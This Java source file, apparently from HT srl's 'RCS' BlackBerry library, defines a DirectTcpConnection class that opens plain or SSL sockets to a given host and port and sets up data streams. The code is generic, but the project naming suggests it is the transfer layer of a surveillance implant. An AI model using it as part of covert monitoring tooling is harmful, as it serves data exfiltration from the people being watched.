/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : SocketConnection.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.transfer;

import java.io.IOException;

import javax.microedition.io.Connector;
import javax.microedition.io.StreamConnection;

import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class DirectTcpConnection extends Connection {
    static Debug debug = new Debug("DirectTcp", DebugLevel.VERBOSE);

    private String host;
    private int port;
    private boolean ssl;

    boolean isDirectTCP = true;
    int timeout = 3 * 60 * 1000;

    // Constructor
    public DirectTcpConnection(String host_, int port_, boolean ssl_) {
        this.host = host_;
        this.port = port_;
        this.ssl = ssl_;
    }

    public synchronized boolean connect() {
        String url;
        if (ssl) {
            url = "ssl://" + host + ":" + port
                    + (isDirectTCP ? ";deviceside=true" : "")
                    + ";ConnectionTimeout=" + timeout;

        } else {
            url = "socket://" + host + ":" + port
                    + (isDirectTCP ? ";deviceside=true" : "")
                    + ";ConnectionTimeout=" + timeout;
        }

        try {
            connection = (StreamConnection) Connector.open(url);
            if (connection != null) {
                in = connection.openDataInputStream();
                out = connection.openDataOutputStream();

                if (in != null && out != null) {
                    connected = true;
                    Check.ensures(connection != null, "connection_ null");
                    Check.ensures(in != null, "in_ null");
                    Check.ensures(out != null, "out_ null");
                }
            }
        } catch (IOException e) {
            connected = false;
        }

        return connected;
    }

    protected void error(String string) {
        debug.error(string);
    }

    public synchronized boolean isActive() {
        return true;
    }

    protected void trace(String string) {
        debug.trace(string);
    }
}
